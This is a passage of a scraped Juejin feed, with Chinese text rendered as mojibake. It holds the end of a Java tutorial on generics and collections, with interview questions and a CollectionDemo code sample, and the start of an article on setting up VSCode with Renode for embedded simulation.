<li>æ¶ˆé™¤å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼šæå‡ä»£ç å¯è¯»æ€§å’Œç®€æ´æ€§ã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼šæ³›å‹æ“¦é™¤æ˜¯ä»€ä¹ˆï¼Ÿè¿è¡Œæ—¶èƒ½è·å–æ³›å‹ç±»å‹å—ï¼Ÿç­”ï¼šæ³›å‹æ“¦é™¤æ˜¯ JVM çš„æœºåˆ¶ï¼šç¼–è¯‘æœŸä¿ç•™æ³›å‹æ£€æŸ¥ï¼Œè¿è¡Œæ—¶æ³›å‹ä¿¡æ¯è¢«æ“¦é™¤ï¼ˆå¦‚<code>List&lt;String&gt;</code>å˜ä¸º<code>List</code>ï¼‰ï¼›é»˜è®¤æ— æ³•è·å–ï¼Œä½†å¯é€šè¿‡åå°„ï¼ˆå¦‚<code>ParameterizedType</code>ï¼‰è·å–æ³›å‹ç±»å‹ï¼ˆä¼ä¸šä¸­æ¡†æ¶å¸¸ç”¨ï¼Œå¦‚ MyBatisï¼‰ã€‚</p>
</li>
<li>
<p>é—®ï¼šæ³›å‹é€šé…ç¬¦<code>?</code>ã€<code>? extends T</code>ã€<code>? super T</code>çš„åŒºåˆ«ï¼Ÿç­”ï¼š</p>
<ul>
<li><code>?</code>ï¼šæ— ç•Œé€šé…ç¬¦ï¼Œå¯æ¥æ”¶ä»»æ„ç±»å‹ï¼Œåªèƒ½è¯»å–ï¼ˆè½¬ Objectï¼‰ï¼Œä¸èƒ½æ·»åŠ ï¼›</li>
<li><code>? extends T</code>ï¼šä¸Šç•Œé€šé…ç¬¦ï¼Œåªèƒ½æ¥æ”¶ T æˆ– T çš„å­ç±»ï¼Œé€‚åˆè¯»å–ï¼›</li>
<li><code>? super T</code>ï¼šä¸‹ç•Œé€šé…ç¬¦ï¼Œåªèƒ½æ¥æ”¶ T æˆ– T çš„çˆ¶ç±»ï¼Œé€‚åˆæ·»åŠ ã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼šæ³›å‹ç±»å’Œæ³›å‹æ–¹æ³•çš„åŒºåˆ«ï¼Ÿç­”ï¼šæ³›å‹ç±»çš„æ³›å‹å‚æ•°åœ¨ç±»çº§åˆ«ï¼Œæ‰€æœ‰æ–¹æ³•å…±äº«ï¼›æ³›å‹æ–¹æ³•çš„æ³›å‹å‚æ•°åœ¨æ–¹æ³•çº§åˆ«ï¼Œç‹¬ç«‹äºç±»ï¼Œå¯åœ¨éæ³›å‹ç±»ä¸­å®šä¹‰ï¼Œè°ƒç”¨æ—¶æ›´çµæ´»ã€‚</p>
</li>
</ol>
<h4 data-id="heading-7">3. ä¼ä¸šå®é™…åº”ç”¨åœºæ™¯</h4>
<ol>
<li><strong>é›†åˆæ¡†æ¶</strong>ï¼šJava é›†åˆï¼ˆList/Map/Setï¼‰å…¨éƒ¨åŸºäºæ³›å‹ï¼Œå¦‚<code>Map&lt;String, User&gt;</code>ã€<code>List&lt;Order&gt;</code>ï¼Œé¿å…ç±»å‹æ··ä¹±ã€‚</li>
<li><strong>é€šç”¨å·¥å…·ç±»</strong>ï¼šä¼ä¸šå°è£…é€šç”¨å·¥å…·ï¼ˆå¦‚ç¼“å­˜å·¥å…·ã€è½¬æ¢å·¥å…·ï¼‰ï¼Œç”¨æ³›å‹é€‚é…å¤šç§ç±»å‹ï¼Œå¦‚<code>CacheUtil&lt;K, V&gt;</code>ã€<code>ConvertUtil&lt;F, T&gt;</code>ã€‚</li>
<li><strong>æ¡†æ¶å¼€å‘</strong>ï¼šSpring/MyBatis ç­‰æ¡†æ¶å¤§é‡ä½¿ç”¨æ³›å‹ï¼Œå¦‚<code>Mapper&lt;User&gt;</code>ã€<code>RestTemplate.getForObject(String url, Class&lt;T&gt; responseType)</code>ã€‚</li>
<li><strong>è‡ªå®šä¹‰å®¹å™¨</strong>ï¼šä¸šåŠ¡ä¸­å°è£…åˆ†é¡µç»“æœ<code>PageResult&lt;T&gt;</code>ï¼Œé€‚é…ç”¨æˆ·åˆ—è¡¨ã€è®¢å•åˆ—è¡¨ç­‰ä¸åŒåˆ†é¡µåœºæ™¯ã€‚</li>
</ol>
<h3 data-id="heading-8">ä¸‰ã€é›†åˆï¼ˆCollectionï¼‰</h3>
<p>é›†åˆæ˜¯ Java å­˜å‚¨å’Œæ“ä½œä¸€ç»„æ•°æ®çš„å®¹å™¨ï¼Œä¼ä¸šä¸­ 90% ä»¥ä¸Šçš„ä¸šåŠ¡éƒ½ä¼šç”¨åˆ°ï¼Œæ ¸å¿ƒåˆ†ä¸º<code>Collection</code>ï¼ˆå•åˆ—ï¼‰å’Œ<code>Map</code>ï¼ˆåŒåˆ—ï¼‰ä¸¤å¤§ä½“ç³»ã€‚</p>
<h4 data-id="heading-9">1. æ ¸å¿ƒä»£ç ç¤ºä¾‹ï¼ˆå¸¸ç”¨é›†åˆ + æ ¸å¿ƒæ“ä½œï¼‰</h4>
<pre><code class="hljs language-csharp" lang="csharp">import java.util.*;

<span class="hljs-comment">/**
 * é›†åˆæ ¸å¿ƒç¤ºä¾‹ï¼š
 * 1. Listï¼ˆArrayList/LinkedListï¼‰
 * 2. Setï¼ˆHashSet/TreeSetï¼‰
 * 3. Mapï¼ˆHashMap/TreeMapï¼‰
 * 4. é›†åˆéå†/æ’åº/ç­›é€‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">CollectionDemo</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
        <span class="hljs-comment">// 1. Listï¼šæœ‰åºã€å¯é‡å¤ã€ç´¢å¼•è®¿é—®</span>
        List&lt;String&gt; arrayList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
        arrayList.<span class="hljs-keyword">add</span>(<span class="hljs-string">"Java"</span>);
        arrayList.<span class="hljs-keyword">add</span>(<span class="hljs-string">"Python"</span>);
        arrayList.<span class="hljs-keyword">add</span>(<span class="hljs-string">"Java"</span>); <span class="hljs-comment">// å…è®¸é‡å¤</span>
        <span class="hljs-comment">// éå†</span>
        <span class="hljs-keyword">for</span> (String s : arrayList) {
            System.<span class="hljs-keyword">out</span>.print(s + <span class="hljs-string">" "</span>);
        }
        System.<span class="hljs-keyword">out</span>.println();
        <span class="hljs-comment">// æ’åº</span>
        Collections.sort(arrayList);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ’åºåï¼š"</span> + arrayList);

        <span class="hljs-comment">// LinkedListï¼šé€‚åˆé¢‘ç¹å¢åˆ ï¼ˆé“¾è¡¨ç»“æ„ï¼‰</span>
        List&lt;Integer&gt; linkedList = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();
        linkedList.addFirst(<span class="hljs-number">1</span>);
        linkedList.addLast(<span class="hljs-number">3</span>);
        linkedList.<span class="hljs-keyword">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// ç´¢å¼•æ’å…¥</span>
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"LinkedListï¼š"</span> + linkedList);

        <span class="hljs-comment">// 2. Setï¼šæ— åºã€ä¸å¯é‡å¤</span>
        Set&lt;String&gt; hashSet = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();
        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">"A"</span>);
        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">"B"</span>);
        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">"A"</span>); <span class="hljs-comment">// é‡å¤å…ƒç´ ä¸ä¼šæ·»åŠ </span>
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"HashSetï¼š"</span> + hashSet); <span class="hljs-comment">// æ— åº</span>

        <span class="hljs-comment">// TreeSetï¼šæœ‰åºï¼ˆè‡ªç„¶æ’åº/è‡ªå®šä¹‰æ’åºï¼‰</span>
        Set&lt;Integer&gt; treeSet = <span class="hljs-keyword">new</span> TreeSet&lt;&gt;();
        treeSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">3</span>);
        treeSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">1</span>);
        treeSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">2</span>);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"TreeSetï¼ˆè‡ªç„¶æ’åºï¼‰ï¼š"</span> + treeSet); <span class="hljs-comment">// [1,2,3]</span>

        <span class="hljs-comment">// 3. Mapï¼šé”®å€¼å¯¹ã€é”®å”¯ä¸€</span>
        Map&lt;String, Integer&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
        hashMap.put(<span class="hljs-string">"è¯­æ–‡"</span>, <span class="hljs-number">90</span>);
        hashMap.put(<span class="hljs-string">"æ•°å­¦"</span>, <span class="hljs-number">95</span>);
        hashMap.put(<span class="hljs-string">"è¯­æ–‡"</span>, <span class="hljs-number">92</span>); <span class="hljs-comment">// è¦†ç›–å·²æœ‰é”®</span>
        <span class="hljs-comment">// éå†Mapï¼ˆä¼ä¸šæ¨èæ–¹å¼ï¼‰</span>
        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : hashMap.entrySet()) {
            System.<span class="hljs-keyword">out</span>.println(entry.getKey() + <span class="hljs-string">"ï¼š"</span> + entry.getValue());
        }
        <span class="hljs-comment">// è·å–å€¼</span>
        Integer mathScore = hashMap.getOrDefault(<span class="hljs-string">"æ•°å­¦"</span>, <span class="hljs-number">0</span>);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ•°å­¦æˆç»©ï¼š"</span> + mathScore);

        <span class="hljs-comment">// TreeMapï¼šæŒ‰é”®æ’åº</span>
        Map&lt;String, Integer&gt; treeMap = <span class="hljs-keyword">new</span> TreeMap&lt;&gt;(hashMap);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"TreeMapï¼ˆæŒ‰é”®æ’åºï¼‰ï¼š"</span> + treeMap);

        <span class="hljs-comment">// 4. é›†åˆç­›é€‰ï¼ˆJDK 8+ Streamï¼‰</span>
        List&lt;Integer&gt; numList = Arrays.asList(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>);
        List&lt;Integer&gt; evenList = numList.stream()
                .filter(num -&gt; num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-comment">// ç­›é€‰å¶æ•°</span>
                .collect(Collectors.toList());
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"å¶æ•°åˆ—è¡¨ï¼š"</span> + evenList);
    }
}
</code></pre>
<p><strong>ä»£ç è¯´æ˜</strong>ï¼š</p>
<ul>
<li><strong>List é€‰å‹</strong>ï¼š<code>ArrayList</code>ï¼ˆæ•°ç»„ç»“æ„ï¼‰é€‚åˆéšæœºè®¿é—®ã€è¯»å¤šå†™å°‘ï¼›<code>LinkedList</code>ï¼ˆé“¾è¡¨ç»“æ„ï¼‰é€‚åˆé¢‘ç¹å¢åˆ ï¼ˆå¦‚é˜Ÿåˆ— / æ ˆï¼‰ã€‚</li>
<li><strong>Set é€‰å‹</strong>ï¼š<code>HashSet</code>ï¼ˆå“ˆå¸Œè¡¨ï¼‰æŸ¥è¯¢å¿«ï¼ˆO (1)ï¼‰ï¼Œæ— åºï¼›<code>TreeSet</code>ï¼ˆçº¢é»‘æ ‘ï¼‰æœ‰åºï¼ŒæŸ¥è¯¢ O (logn)ã€‚</li>
<li><strong>Map é€‰å‹</strong>ï¼š<code>HashMap</code>ï¼ˆå“ˆå¸Œè¡¨ï¼‰ä¼ä¸šé¦–é€‰ï¼ŒæŸ¥è¯¢ / æ’å…¥å¿«ï¼›<code>TreeMap</code>æŒ‰é”®æ’åºï¼Œé€‚åˆéœ€è¦æœ‰åºçš„åœºæ™¯ã€‚</li>
<li><strong>Stream æµ</strong>ï¼šJDK 8 + ç‰¹æ€§ï¼Œä¼ä¸šä¸­æ›¿ä»£ä¼ ç»Ÿå¾ªç¯ï¼Œå®ç°é›†åˆçš„ç­›é€‰ã€æ˜ å°„ã€èšåˆï¼Œä»£ç æ›´ç®€æ´ã€‚</li>
</ul>
<h4 data-id="heading-10">2. ä¼ä¸šé¢è¯•é¢˜</h4>
<ol>
<li>
<p>é—®ï¼šArrayList å’Œ LinkedList çš„åŒºåˆ«ï¼Ÿä¼ä¸šä¸­å¦‚ä½•é€‰æ‹©ï¼Ÿç­”ï¼š</p>
<ul>
<li>åº•å±‚ç»“æ„ï¼šArrayList æ˜¯åŠ¨æ€æ•°ç»„ï¼ŒLinkedList æ˜¯åŒå‘é“¾è¡¨ï¼›</li>
<li>è®¿é—®æ•ˆç‡ï¼šArrayList éšæœºè®¿é—®å¿«ï¼ˆO (1)ï¼‰ï¼ŒLinkedList æ…¢ï¼ˆO (n)ï¼‰ï¼›</li>
<li>å¢åˆ æ•ˆç‡ï¼šArrayList å°¾éƒ¨å¢åˆ å¿«ï¼Œä¸­é—´å¢åˆ æ…¢ï¼ˆéœ€ç§»åŠ¨å…ƒç´ ï¼‰ï¼›LinkedList ä»»æ„ä½ç½®å¢åˆ å¿«ï¼ˆO (1)ï¼‰ï¼›</li>
<li>å†…å­˜ï¼šArrayList æœ‰æ‰©å®¹å†—ä½™ï¼ŒLinkedList æ¯ä¸ªèŠ‚ç‚¹å­˜å‰åæŒ‡é’ˆï¼Œå†…å­˜å ç”¨é«˜ï¼›</li>
<li>é€‰å‹ï¼šè¯»å¤šå†™å°‘ç”¨ ArrayListï¼Œé¢‘ç¹å¢åˆ ï¼ˆå¦‚é˜Ÿåˆ—ï¼‰ç”¨ LinkedListã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼šHashMap çš„åº•å±‚åŸç†ï¼ŸJDK 1.7 å’Œ 1.8 çš„åŒºåˆ«ï¼Ÿç­”ï¼š</p>
<ul>
<li>JDK 1.7ï¼šæ•°ç»„ + é“¾è¡¨ï¼Œå“ˆå¸Œå†²çªç”¨é“¾è¡¨è§£å†³ï¼Œå¤´æ’æ³•ï¼ˆå¤šçº¿ç¨‹ä¸‹æ˜“æˆç¯ï¼‰ï¼›</li>
<li>JDK 1.8ï¼šæ•°ç»„ + é“¾è¡¨ + çº¢é»‘æ ‘ï¼Œé“¾è¡¨é•¿åº¦â‰¥8 ä¸”æ•°ç»„é•¿åº¦â‰¥64 æ—¶è½¬çº¢é»‘æ ‘ï¼Œå°¾æ’æ³•ï¼Œè§£å†³æˆç¯é—®é¢˜ï¼›</li>
<li>æ ¸å¿ƒï¼šé€šè¿‡ hashCode è®¡ç®—ç´¢å¼•ï¼Œequals åˆ¤æ–­é”®æ˜¯å¦ç›¸åŒï¼Œè´Ÿè½½å› å­ 0.75ï¼ˆå¹³è¡¡ç©ºé—´å’Œæ—¶é—´ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼šHashSet å’Œ HashMap çš„å…³ç³»ï¼ŸHashSet å¦‚ä½•ä¿è¯å…ƒç´ ä¸é‡å¤ï¼Ÿç­”ï¼šHashSet åº•å±‚æ˜¯ HashMapï¼ˆç”¨ HashMap çš„ key å­˜å…ƒç´ ï¼Œvalue å­˜å›ºå®šå¯¹è±¡ï¼‰ï¼›æ·»åŠ å…ƒç´ æ—¶ï¼Œå…ˆè®¡ç®— hashCodeï¼Œå†ç”¨ equals åˆ¤æ–­ï¼Œè‹¥å·²å­˜åœ¨åˆ™ä¸æ·»åŠ ï¼Œä¿è¯å”¯ä¸€æ€§ã€‚</p>
</li>
<li>
<p>é—®ï¼šé›†åˆçš„éå†æ–¹å¼æœ‰å“ªäº›ï¼Ÿå“ªç§æ•ˆç‡æœ€é«˜ï¼Ÿç­”ï¼š</p>
<ul>
<li>Listï¼šæ™®é€š forï¼ˆç´¢å¼•ï¼‰ã€å¢å¼º forã€è¿­ä»£å™¨ï¼ˆIteratorï¼‰ã€Streamï¼›</li>
<li>Mapï¼škeySet+getã€entrySetã€forEachï¼ˆJDK 8+ï¼‰ï¼›</li>
<li>æ•ˆç‡ï¼šArrayList ç”¨æ™®é€š for æœ€å¿«ï¼ŒLinkedList ç”¨è¿­ä»£å™¨ / å¢å¼º for æœ€å¿«ï¼›Map ç”¨ entrySet éå†æœ€å¿«ï¼ˆé¿å…å¤šæ¬¡ getï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h4 data-id="heading-11">3. ä¼ä¸šå®é™…åº”ç”¨åœºæ™¯</h4>
<ol>
<li><strong>æ•°æ®å­˜å‚¨</strong>ï¼šæ¥å£è¿”å›åˆ—è¡¨ï¼ˆå¦‚ç”¨æˆ·åˆ—è¡¨ã€è®¢å•åˆ—è¡¨ï¼‰ç”¨<code>List</code>ï¼›å»é‡æ•°æ®ï¼ˆå¦‚å•†å“æ ‡ç­¾ã€ç”¨æˆ· IDï¼‰ç”¨<code>HashSet</code>ï¼›é”®å€¼å¯¹æ•°æ®ï¼ˆå¦‚ç”¨æˆ· IDâ†’ç”¨æˆ·ä¿¡æ¯ï¼‰ç”¨<code>HashMap</code>ã€‚</li>
<li><strong>ç¼“å­˜å®ç°</strong>ï¼šæœ¬åœ°ç¼“å­˜ï¼ˆå¦‚åŠ è½½å­—å…¸æ•°æ®ï¼‰ç”¨<code>HashMap</code>ï¼Œæœ‰åºç¼“å­˜ç”¨<code>TreeMap</code>ã€‚</li>
<li><strong>æ•°æ®å¤„ç†</strong>ï¼šæ‰¹é‡æ•°æ®ç­›é€‰ï¼ˆå¦‚ç­›é€‰æœªæ”¯ä»˜è®¢å•ï¼‰ã€èšåˆï¼ˆå¦‚ç»Ÿè®¡å„éƒ¨é—¨äººæ•°ï¼‰ç”¨ Stream æµã€‚</li>
<li><strong>å¹¶å‘åœºæ™¯</strong>ï¼šé«˜å¹¶å‘ä¸‹ç”¨<code>ConcurrentHashMap</code>ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰æ›¿ä»£<code>HashMap</code>ï¼Œç”¨<code>CopyOnWriteArrayList</code>æ›¿ä»£<code>ArrayList</code>ã€‚</li>
</ol>
<h3 data-id="heading-12">æ€»ç»“</h3>
<ol>
<li><strong>å¼‚å¸¸</strong>ï¼šæ ¸å¿ƒæ˜¯åŒºåˆ†ç¼–è¯‘æ—¶ / è¿è¡Œæ—¶å¼‚å¸¸ï¼Œä¼ä¸šä¸­è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸ + å…¨å±€ç»Ÿä¸€å¤„ç†ï¼Œé¿å…ç¨‹åºå´©æºƒå’Œä¿¡æ¯æ³„éœ²ã€‚</li>
<li><strong>æ³›å‹</strong>ï¼šè§£å†³ç±»å‹å®‰å…¨å’Œä»£ç å¤ç”¨é—®é¢˜ï¼Œæ˜¯é›†åˆã€æ¡†æ¶çš„åŸºç¡€ï¼Œé‡ç‚¹æŒæ¡æ³›å‹ç±» / æ–¹æ³•å’Œé€šé…ç¬¦çš„ä½¿ç”¨ã€‚</li>
<li><strong>é›†åˆ</strong>ï¼šä¼ä¸šå¼€å‘é«˜é¢‘ä½¿ç”¨ï¼Œæ ¸å¿ƒæ˜¯æ ¹æ®ä¸šåŠ¡åœºæ™¯é€‰å‹ï¼ˆArrayList/HashMap ä¸ºé¦–é€‰ï¼‰ï¼ŒæŒæ¡åº•å±‚åŸç†å’Œé«˜æ•ˆéå†æ–¹å¼ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VSCode + Renodeï¼šæ‰“é€ ç°ä»£åŒ–çš„åµŒå…¥å¼ä»¿çœŸå¼€å‘ç¯]]></title>    <link>https://juejin.cn/post/7580988382761091087</link>    <guid>https://juejin.cn/post/7580988382761091087</guid>    <pubDate>2025-12-08T04:28:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580988382761091087" data-draft-id="7580988382761009167" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VSCode + Renodeï¼šæ‰“é€ ç°ä»£åŒ–çš„åµŒå…¥å¼ä»¿çœŸå¼€å‘ç¯"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2025-12-08T04:28:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="11cookies11"/> <meta itemprop="url" content="https://juejin.cn/user/1259367703787244"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VSCode + Renodeï¼šæ‰“é€ ç°ä»£åŒ–çš„åµŒå…¥å¼ä»¿çœŸå¼€å‘ç¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1259367703787244/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    11cookies11
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:28:47.000Z" title="Mon Dec 08 2025 04:28:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä¼ ç»Ÿçš„åµŒå…¥å¼å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦ä¾èµ–å®ä½“å¼€å‘æ¿ã€ä»¿çœŸå™¨ï¼ˆST-Link/J-Linkï¼‰ã€å„ç§é©±åŠ¨ã€å¤æ‚çš„ IDEï¼ˆå¦‚ IARã€Keilï¼‰ï¼Œä¸ä»…ç¯å¢ƒæ­å»ºç¹çï¼Œè¿˜ä¼šå—åˆ°ç¡¬ä»¶æ•°é‡ã€æ¡ä»¶ã€æµ‹è¯•é£é™©çš„é™åˆ¶ã€‚</p>
<p>ä½†éšç€ <strong>Renodeï¼ˆAntmicroï¼‰</strong> çš„æˆç†Ÿï¼Œç°åœ¨æˆ‘ä»¬ç»ˆäºå¯ä»¥ï¼š</p>
<ul>
<li>ä½¿ç”¨ <strong>VSCode + GCC</strong> åšç°ä»£åŒ–çš„ç¼–è¾‘ä½“éªŒ</li>
<li>ä½¿ç”¨ <strong>Renode</strong> æ¨¡æ‹Ÿ **CPU + å¤–è®¾ **</li>
<li>ä½¿ç”¨ <strong>GDB Server</strong> å®ç°è°ƒè¯•</li>
<li>ç”šè‡³å¯ä»¥åœ¨æœåŠ¡å™¨ï¼ˆæ ‘è“æ´¾/OrangePiï¼‰ä¸Šè¿œç¨‹è·‘ Renode</li>
</ul>
<p>è¿‡å»å‡ å¤©ï¼Œæˆ‘ä¸€æ­¥æ­¥æ­å¥½äº†ä» VSCode â†’ Renode â†’ GDB çš„å®Œæ•´é“¾è·¯ï¼Œå¹¶è§£å†³äº†ä¸€å †å‘ã€‚  è¿™ç¯‡æ–‡ç« è®°å½•å®Œæ•´çš„æµç¨‹ã€å…³é”®é…ç½®ã€å¸¸è§é”™è¯¯ä¸è§£å†³æ–¹å¼ã€‚</p>
<h3 data-id="heading-0">ğŸ“Œ ä¸€ã€ä¸ºä»€ä¹ˆé€‰æ‹© Renode + VSCodeï¼Ÿ</h3>
<p>ç°ä»£åµŒå…¥å¼å¼€å‘å·²ç»ä»è¿™æ ·çš„æ–¹å¼ï¼š</p>
